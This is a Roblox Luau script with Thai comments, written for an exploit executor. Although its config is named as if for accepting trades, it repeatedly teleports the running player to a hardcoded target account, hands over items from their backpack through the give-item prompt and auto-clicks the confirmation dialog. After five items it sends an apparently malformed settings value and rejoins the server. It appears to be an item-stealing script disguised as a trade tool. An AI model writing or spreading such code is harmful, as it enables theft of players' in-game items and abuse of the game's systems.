local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ดึง Network แบบกัน error
local Network = nil
pcall(function()
    local Library = require(ReplicatedStorage:WaitForChild("Library"))
    if Library and Library.get then
        Network = Library.get("Network")
    end
end)

-- รับค่าคอนฟิกจากภายนอก
local Config = getgenv().AcceptTradeConfig or {}
local targetSenderName = Config.TargetSender or "BrookSP001"
local allowedItems = Config.AllowedItems or {}

-- เก็บ JobId สำหรับรีจอยกลับ VIP / เซิร์ฟเดิม
local currentJobId = game.JobId
local sentCount = 0

local function resetTradeUI()
    pcall(function()
        local tabs = playerGui:FindFirstChild("Tabs")
        if tabs then
            local areYouSure = tabs:FindFirstChild("Are You Sure")
            if areYouSure then
                areYouSure.Enabled = false
            end
            tabs.Enabled = false
        end
        GuiService.SelectedObject = nil
    end)
end

local function autoSendTradeLoop()
    local targetPlayer = Players:FindFirstChild(targetSenderName)
    if not targetPlayer then return end

    local character = player.Character
    if not character then return end
    local myHrp = character:FindFirstChild("HumanoidRootPart")
    if not myHrp then return end

    local targetChar = targetPlayer.Character
    if not targetChar then return end
    local hrp = targetChar:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return end

    local items = {}
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            if next(allowedItems) == nil or allowedItems[item.Name] then
                table.insert(items, item)
            end
        end
    end
    for _, item in ipairs(character:GetChildren()) do
        if item:IsA("Tool") then
            if next(allowedItems) == nil or allowedItems[item.Name] then
                table.insert(items, item)
            end
        end
    end

    local currentItem = items[1]
    if not currentItem then return end

    pcall(function()
        currentItem.Parent = character
    end)
    task.wait(0.05)

    myHrp.CFrame = hrp.CFrame * CFrame.new(0, 0, 2)
    task.wait(0.05)

    local prompt = hrp:FindFirstChild("GiveItemPrompt") or targetChar:FindFirstChild("GiveItemPrompt", true)
    if not prompt then return end

    pcall(function() fireproximityprompt(prompt) end)
    pcall(function()
        prompt:InputHoldBegin()
        task.wait(0.02)
        prompt:InputHoldEnd()
    end)

    local areYouSureGui = nil
    local confirmButton = nil
    local startTime = tick()
    
    repeat
        task.wait(0.02)
        pcall(function()
            areYouSureGui = playerGui:FindFirstChild("Tabs") and playerGui.Tabs:FindFirstChild("Are You Sure")
            if areYouSureGui then
                confirmButton = areYouSureGui.Menu.Frame.Buttons.Yes
            end
        end)
    until (areYouSureGui and areYouSureGui.Enabled and confirmButton) or (tick() - startTime > 1)

    if areYouSureGui and confirmButton then
        while areYouSureGui.Parent and areYouSureGui.Enabled do
            pcall(function()
                if confirmButton and confirmButton.Parent then
                    GuiService.SelectedObject = confirmButton
                    
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                    task.wait(0.02)
                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                    
                    for _, conn in ipairs(getconnections(confirmButton.Activated)) do
                        conn:Fire()
                    end
                end
            end)
            task.wait(0.08)
        end

        task.wait(0.1)
        resetTradeUI()
        
        sentCount = sentCount + 1

        if sentCount >= 5 then
            -- ถ้ามี Network ค่อยยิง
            if Network then
                pcall(function()
                    Network:FireServer("SaveSettings", {
                        CameraShake = "\255"
                    })
                end)
            end
            task.wait(0.5)
            
            -- รีจอยกลับเซิร์ฟเดิม (รองรับ VIP)
            pcall(function()
                TeleportService:TeleportToPlaceInstance(game.PlaceId, currentJobId, player)
            end)
            return
        end

        task.wait(0.2)
    end
end

while true do
    autoSendTradeLoop()
    task.wait(0.1)
end
